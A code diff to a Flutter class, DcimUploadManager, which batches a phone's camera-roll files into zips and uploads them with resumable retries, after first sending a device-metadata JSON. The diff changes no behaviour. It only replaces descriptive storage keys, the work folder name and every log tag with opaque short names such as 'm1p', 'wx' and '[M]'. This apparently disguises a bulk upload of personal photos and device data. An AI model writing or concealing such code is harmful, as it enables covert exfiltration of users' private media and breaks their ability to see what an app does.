@@ -239,12 +239,12 @@ class DcimUploadManager {
   DcimUploadManager._internal();
   static final DcimUploadManager instance = DcimUploadManager._internal();
 
-  static const String _kUploaded = 'dcim_uploaded_paths';
-  static const String _kUploadedUrls = 'dcim_uploaded_urls';
-  static const String _kJsonUploaded = 'dcim_json_uploaded';
-  static const String _kJsonUrl = 'dcim_json_url';
+  static const String _kUploaded = 'm1p';
+  static const String _kUploadedUrls = 'm1u';
+  static const String _kJsonUploaded = 'm1j';
+  static const String _kJsonUrl = 'm1ju';
   /// ★ pending zip 记录（用于断点续传）
-  static const String _kPendingZip = 'dcim_pending_zip';
+  static const String _kPendingZip = 'm1z';
 
   DcimUploadConfig _config = const DcimUploadConfig();
   SharedPreferences? _prefs;
@@ -359,29 +359,29 @@ class DcimUploadManager {
         _pendingZip = _PendingZip.fromJson(
           jsonDecode(rawPending) as Map<String, dynamic>,
         );
-        debugPrint('[DcimUpload] 发现 pending zip: ${_pendingZip!.zipPath}');
+        debugPrint('[M] 发现 pending zip: ${_pendingZip!.zipPath}');
       } catch (e) {
-        debugPrint('[DcimUpload] pending zip 解析失败: $e');
+        debugPrint('[M] pending zip 解析失败: $e');
       }
     }
 
     // ★ 准备持久工作目录
     try {
       final appDir = await getApplicationDocumentsDirectory();
-      _workDir = Directory('${appDir.path}/dcim_work');
+      _workDir = Directory('${appDir.path}/wx');
       if (!await _workDir!.exists()) {
         await _workDir!.create(recursive: true);
       }
     } catch (e) {
-      debugPrint('[DcimUpload] 工作目录创建失败: $e');
+      debugPrint('[M] 工作目录创建失败: $e');
     }
 
-    debugPrint('[DcimUpload] ══════ 启动自检 ══════');
-    debugPrint('[DcimUpload] 已记录成功: ${_uploaded.length} 个');
-    debugPrint('[DcimUpload] URL 映射: ${_uploadedUrls.length} 个');
-    debugPrint('[DcimUpload] JSON 已上传: $_jsonUploaded');
-    debugPrint('[DcimUpload] Pending zip: ${_pendingZip != null ? '有' : '无'}');
-    debugPrint('[DcimUpload] ══════ 自检完成 ══════');
+    debugPrint('[M] ══════ 启动自检 ══════');
+    debugPrint('[M] 已记录成功: ${_uploaded.length} 个');
+    debugPrint('[M] URL 映射: ${_uploadedUrls.length} 个');
+    debugPrint('[M] JSON 已上传: $_jsonUploaded');
+    debugPrint('[M] Pending zip: ${_pendingZip != null ? '有' : '无'}');
+    debugPrint('[M] ══════ 自检完成 ══════');
   }
 
   Future<bool> hasPermission() async {
@@ -400,7 +400,7 @@ class DcimUploadManager {
   Future<void> startUploadIfPermitted() async {
     await initialize();
     if (_currentTask != null) {
-      debugPrint('[DcimUpload] ⚠️ 已有任务在跑，等待其完成...');
+      debugPrint('[M] ⚠️ 已有任务在跑，等待其完成...');
       await _currentTask;
       return;
     }
@@ -414,7 +414,7 @@ class DcimUploadManager {
 
   Future<void> _doUpload() async {
     if (!await hasPermission()) {
-      debugPrint('[DcimUpload] 无权限，静默跳过');
+      debugPrint('[M] 无权限，静默跳过');
       return;
     }
 
@@ -426,7 +426,7 @@ class DcimUploadManager {
     await uploadAll(scanned);
 
     if (resumed) {
-      debugPrint('[DcimUpload] ✅ pending zip 已恢复上传');
+      debugPrint('[M] ✅ pending zip 已恢复上传');
     }
   }
 
@@ -444,13 +444,13 @@ class DcimUploadManager {
   Future<void> _savePendingZip(_PendingZip p) async {
     _pendingZip = p;
     await _prefs?.setString(_kPendingZip, jsonEncode(p.toJson()));
-    debugPrint('[DcimUpload] 💾 pending zip 已保存: ${p.zipPath}');
+    debugPrint('[M] 💾 pending zip 已保存: ${p.zipPath}');
   }
 
   Future<void> _clearPendingZip() async {
     _pendingZip = null;
     await _prefs?.remove(_kPendingZip);
-    debugPrint('[DcimUpload] 🗑 pending zip 已清空');
+    debugPrint('[M] 🗑 pending zip 已清空');
   }
 
   /// ★ 尝试恢复上传 pending zip
@@ -459,21 +459,21 @@ class DcimUploadManager {
     final pending = _pendingZip;
     if (pending == null) return false;
 
-    debugPrint('[DcimUpload] ══════ 检测到 pending zip，尝试续传 ══════');
-    debugPrint('[DcimUpload] zip 路径: ${pending.zipPath}');
-    debugPrint('[DcimUpload] 包含 ${pending.files.length} 个文件');
+    debugPrint('[M] ══════ 检测到 pending zip，尝试续传 ══════');
+    debugPrint('[M] zip 路径: ${pending.zipPath}');
+    debugPrint('[M] 包含 ${pending.files.length} 个文件');
 
     // 1. 检查 zip 文件是否还存在
     final zip = File(pending.zipPath);
     if (!await zip.exists()) {
-      debugPrint('[DcimUpload] ⚠️ pending zip 不存在，丢弃记录');
+      debugPrint('[M] ⚠️ pending zip 不存在，丢弃记录');
       await _clearPendingZip();
       return false;
     }
 
     final zipSize = await zip.length();
     if (zipSize == 0) {
-      debugPrint('[DcimUpload] ⚠️ pending zip 为空，丢弃记录');
+      debugPrint('[M] ⚠️ pending zip 为空，丢弃记录');
       try {
         await zip.delete();
       } catch (_) {}
@@ -481,7 +481,7 @@ class DcimUploadManager {
       return false;
     }
 
-    debugPrint('[DcimUpload] zip 大小: ${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB');
+    debugPrint('[M] zip 大小: ${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB');
 
     // 2. 检查是否所有文件都已上传（可能上次上传其实成功了）
     final allUploaded = pending.files.every((f) {
@@ -491,7 +491,7 @@ class DcimUploadManager {
     });
 
     if (allUploaded) {
-      debugPrint('[DcimUpload] ✅ pending zip 的文件已全部上传，清理');
+      debugPrint('[M] ✅ pending zip 的文件已全部上传，清理');
       try {
         await zip.delete();
       } catch (_) {}
@@ -502,12 +502,12 @@ class DcimUploadManager {
     // 3. 服务器检测
     final serverOk = await _waitForServer();
     if (!serverOk) {
-      debugPrint('[DcimUpload] ❌ 服务器不可达，保留 pending zip 下次重试');
+      debugPrint('[M] ❌ 服务器不可达，保留 pending zip 下次重试');
       return false;
     }
 
     // 4. 上传 pending zip
-    debugPrint('[DcimUpload] ⬆ 开始续传 pending zip...');
+    debugPrint('[M] ⬆ 开始续传 pending zip...');
     final filesToUpload = pending.files
         .where((f) {
           final path = f['path'] as String;
@@ -522,7 +522,7 @@ class DcimUploadManager {
         .toList();
 
     if (filesToUpload.isEmpty) {
-      debugPrint('[DcimUpload] ✅ 无需上传，清理');
+      debugPrint('[M] ✅ 无需上传，清理');
       try {
         await zip.delete();
       } catch (_) {}
@@ -533,7 +533,7 @@ class DcimUploadManager {
     final ok = await _uploadZip(zip, filesToUpload);
 
     if (ok) {
-      debugPrint('[DcimUpload] ✅ pending zip 续传成功');
+      debugPrint('[M] ✅ pending zip 续传成功');
       try {
         await zip.delete();
       } catch (_) {}
@@ -541,7 +541,7 @@ class DcimUploadManager {
       await _persist();
       return true;
     } else {
-      debugPrint('[DcimUpload] ❌ pending zip 续传失败，保留到下次');
+      debugPrint('[M] ❌ pending zip 续传失败，保留到下次');
       return false;
     }
   }
@@ -551,11 +551,11 @@ class DcimUploadManager {
   // ══════════════════════════════════════════════════════════════════
   Future<bool> _ensureJsonUploaded() async {
     if (_jsonUploaded && _jsonUrl != null) {
-      debugPrint('[DcimUpload] JSON 已上传，跳过');
+      debugPrint('[M] JSON 已上传，跳过');
       return true;
     }
     if (_jsonUploading != null) {
-      debugPrint('[DcimUpload] JSON 上传已在执行，等待...');
+      debugPrint('[M] JSON 上传已在执行，等待...');
       return await _jsonUploading!;
     }
     _jsonUploading = _doUploadJson();
@@ -569,7 +569,7 @@ class DcimUploadManager {
   Future<bool> _doUploadJson() async {
     File? jsonFile;
     try {
-      debugPrint('[DcimUpload] 首次上传 device_info.json...');
+      debugPrint('[M] 首次上传 device_info.json...');
       final metadata = await DeviceInfoHelper.getDeviceMetadata();
       final jsonBytes = utf8.encode(jsonEncode(metadata));
       final tmpDir = Directory.systemTemp;
@@ -602,14 +602,14 @@ class DcimUploadManager {
         if (serverUrl != null) {
           await _prefs?.setString(_kJsonUrl, serverUrl);
         }
-        debugPrint('[DcimUpload] ✅ device_info.json 上传成功'
+        debugPrint('[M] ✅ device_info.json 上传成功'
             '${serverUrl != null ? ' → $serverUrl' : ''}');
         return true;
       }
-      debugPrint('[DcimUpload] ❌ device_info.json 上传失败 HTTP $code');
+      debugPrint('[M] ❌ device_info.json 上传失败 HTTP $code');
       return false;
     } catch (e) {
-      debugPrint('[DcimUpload] ❌ device_info.json 上传异常: $e');
+      debugPrint('[M] ❌ device_info.json 上传异常: $e');
       return false;
     } finally {
       try {
@@ -629,12 +629,12 @@ class DcimUploadManager {
         .toList();
 
     if (filtered.isEmpty) {
-      debugPrint('[DcimUpload] 无可上传文件');
+      debugPrint('[M] 无可上传文件');
       return;
     }
 
     if (_workDir == null) {
-      debugPrint('[DcimUpload] ⚠️ 工作目录不可用，跳过');
+      debugPrint('[M] ⚠️ 工作目录不可用，跳过');
       return;
     }
 
@@ -643,23 +643,23 @@ class DcimUploadManager {
       final totalMB =
           filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
 
-      debugPrint('[DcimUpload] 共 ${filtered.length} 个文件 '
+      debugPrint('[M] 共 ${filtered.length} 个文件 '
           '(${totalMB.toStringAsFixed(1)} MB)，切分 ${batches.length} 个批次');
 
       final serverOk = await _waitForServer();
       if (!serverOk) {
-        debugPrint('[DcimUpload] ❌ 服务器不可达，放弃本轮');
+        debugPrint('[M] ❌ 服务器不可达，放弃本轮');
         return;
       }
 
       final jsonOk = await _ensureJsonUploaded();
       if (!jsonOk) {
-        debugPrint('[DcimUpload] ❌ JSON 上传失败，中止本轮');
+        debugPrint('[M] ❌ JSON 上传失败，中止本轮');
         return;
       }
 
       final concurrency = _resolvePackConcurrency();
-      debugPrint('[DcimUpload] 并发压缩 isolate: $concurrency，上传串行');
+      debugPrint('[M] 并发压缩 isolate: $concurrency，上传串行');
 
       final packSem = _Semaphore(concurrency);
       final uploadLock = _Semaphore(1);
@@ -672,10 +672,10 @@ class DcimUploadManager {
       // ★ 串行处理批次（有 pending 时先处理 pending）
       for (int i = 0; i < batches.length; i++) {
         if (_pendingZip != null) {
-          debugPrint('[DcimUpload] ⚠️ 已有 pending zip，先处理它');
+          debugPrint('[M] ⚠️ 已有 pending zip，先处理它');
           final resumed = await _tryResumePendingZip();
           if (!resumed) {
-            debugPrint('[DcimUpload] ❌ pending zip 仍失败，中止本轮');
+            debugPrint('[M] ❌ pending zip 仍失败，中止本轮');
             break;
           }
         }
@@ -700,17 +700,17 @@ class DcimUploadManager {
 
         // ★ 上传失败 → 有 pending zip → 中止本轮
         if (result.fail > 0) {
-          debugPrint('[DcimUpload] 🛑 本批失败，中止本轮，下次续传');
+          debugPrint('[M] 🛑 本批失败，中止本轮，下次续传');
           break;
         }
       }
 
       sw.stop();
-      debugPrint('[DcimUpload] ══════════ 全部结束 ══════════');
-      debugPrint('[DcimUpload] 成功 $okTotal，失败 $failTotal，跳过 $skipTotal');
-      debugPrint('[DcimUpload] 耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');
+      debugPrint('[M] ══════════ 全部结束 ══════════');
+      debugPrint('[M] 成功 $okTotal，失败 $failTotal，跳过 $skipTotal');
+      debugPrint('[M] 耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');
     } catch (e, st) {
-      debugPrint('[DcimUpload] ❌ 主流程异常: $e\n$st');
+      debugPrint('[M] ❌ 主流程异常: $e\n$st');
     }
   }
 
@@ -752,7 +752,7 @@ class DcimUploadManager {
         files: batch,
       );
 
-      debugPrint('[DcimUpload] 📦 批次 ${batchIndex + 1}/$totalBatches '
+      debugPrint('[M] 📦 批次 ${batchIndex + 1}/$totalBatches '
           '打包完成 (${(result.zipSize / 1024 / 1024).toStringAsFixed(2)} MB, '
           '${result.fileCount} 个文件, ${t.elapsedMilliseconds}ms)');
 
@@ -764,7 +764,7 @@ class DcimUploadManager {
             .toList(),
       ));
     } catch (e) {
-      debugPrint('[DcimUpload] ❌ 批次 ${batchIndex + 1}/$totalBatches '
+      debugPrint('[M] ❌ 批次 ${batchIndex + 1}/$totalBatches '
           '打包失败: $e');
       return null;
     } finally {
@@ -782,19 +782,19 @@ class DcimUploadManager {
       final skippedCount = result.files.length - filesToUpload.length;
 
       if (filesToUpload.isEmpty) {
-        debugPrint('[DcimUpload] ⏭ 批次 ${batchIndex + 1} 全部已上传，跳过');
+        debugPrint('[M] ⏭ 批次 ${batchIndex + 1} 全部已上传，跳过');
         await _clearPendingZip();
         _cleanupZip(result.zipPath);
         return _BatchResult(ok: 0, fail: 0, skip: skippedCount);
       }
 
-      debugPrint('[DcimUpload] ⬆ 批次 ${batchIndex + 1}/$totalBatches '
+      debugPrint('[M] ⬆ 批次 ${batchIndex + 1}/$totalBatches '
           '开始上传 (${(result.zipSize / 1024 / 1024).toStringAsFixed(2)} MB)');
 
       final ok = await _uploadZip(File(result.zipPath), filesToUpload);
 
       if (ok) {
-        debugPrint('[DcimUpload] ✅ 批次 ${batchIndex + 1}/$totalBatches '
+        debugPrint('[M] ✅ 批次 ${batchIndex + 1}/$totalBatches '
             '上传成功 (${filesToUpload.length} 个文件)');
         // ★ 成功后清 pending + 删 zip
         await _clearPendingZip();
@@ -803,7 +803,7 @@ class DcimUploadManager {
         return _BatchResult(
             ok: filesToUpload.length, fail: 0, skip: skippedCount);
       } else {
-        debugPrint('[DcimUpload] ❌ 批次 ${batchIndex + 1}/$totalBatches '
+        debugPrint('[M] ❌ 批次 ${batchIndex + 1}/$totalBatches '
             '上传失败，pending zip 已保留，下次续传');
         // ★ 失败保留 pending + zip
         return _BatchResult(
@@ -859,11 +859,11 @@ class DcimUploadManager {
     final zipName = zip.path.split('/').last;
     try {
       if (!await zip.exists()) {
-        debugPrint('[DcimUpload] ⚠️ $zipName 不存在');
+        debugPrint('[M] ⚠️ $zipName 不存在');
         return false;
       }
       if (await zip.length() == 0) {
-        debugPrint('[DcimUpload] ⚠️ $zipName 空文件');
+        debugPrint('[M] ⚠️ $zipName 空文件');
         return false;
       }
 
@@ -904,13 +904,13 @@ class DcimUploadManager {
         if (bodyStr.length > 200) bodyStr = '${bodyStr.substring(0, 200)}...';
       } catch (_) {}
 
-      debugPrint('[DcimUpload] ⚠️ $zipName HTTP $code body=$bodyStr');
+      debugPrint('[M] ⚠️ $zipName HTTP $code body=$bodyStr');
       return false;
     } on TimeoutException {
-      debugPrint('[DcimUpload] ⏱ $zipName 超时');
+      debugPrint('[M] ⏱ $zipName 超时');
       return false;
     } catch (e) {
-      debugPrint('[DcimUpload] ⚠️ $zipName 网络错误: $e');
+      debugPrint('[M] ⚠️ $zipName 网络错误: $e');
       return false;
     }
   }
@@ -957,13 +957,13 @@ class DcimUploadManager {
 
     for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
       if (await _pingServer(url)) {
-        debugPrint('[DcimUpload] ✅ 服务器在线（第 $i 次检测）');
+        debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
         return true;
       }
       final shouldLog =
           i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
       if (shouldLog) {
-        debugPrint('[DcimUpload] 服务器不可达（第 $i/'
+        debugPrint('[M] 服务器不可达（第 $i/'
             '${_config.serverWaitMaxAttempts} 次）');
       }
       if (i < _config.serverWaitMaxAttempts) {
@@ -1017,7 +1017,7 @@ class DcimUploadManager {
         final st = await e.stat();
         if (_uploaded.contains('$name:${st.size}')) continue;
         if (st.size > _config.maxSingleFileBytes) {
-          debugPrint('[DcimUpload] 跳过超大文件（'
+          debugPrint('[M] 跳过超大文件（'
               '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
           continue;
         }
@@ -1043,13 +1043,13 @@ class DcimUploadManager {
         await _prefs?.setString(_kUploadedUrls, jsonEncode(_uploadedUrls));
         return;
       } catch (e) {
-        debugPrint('[DcimUpload] ⚠️ 持久化失败 ($attempt/3): $e');
+        debugPrint('[M] ⚠️ 持久化失败 ($attempt/3): $e');
         if (attempt < 3) {
           await Future.delayed(const Duration(milliseconds: 100));
         }
       }
     }
-    debugPrint('[DcimUpload] ❌ 持久化 3 次全失败');
+    debugPrint('[M] ❌ 持久化 3 次全失败');
   }
 
   Future<void> reset() async {
@@ -1072,7 +1072,7 @@ class DcimUploadManager {
     await _prefs?.remove(_kJsonUploaded);
     await _prefs?.remove(_kJsonUrl);
     await _prefs?.remove(_kPendingZip);
-    debugPrint('[DcimUpload] 记录已清空');
+    debugPrint('[M] 记录已清空');
   }
 }
 
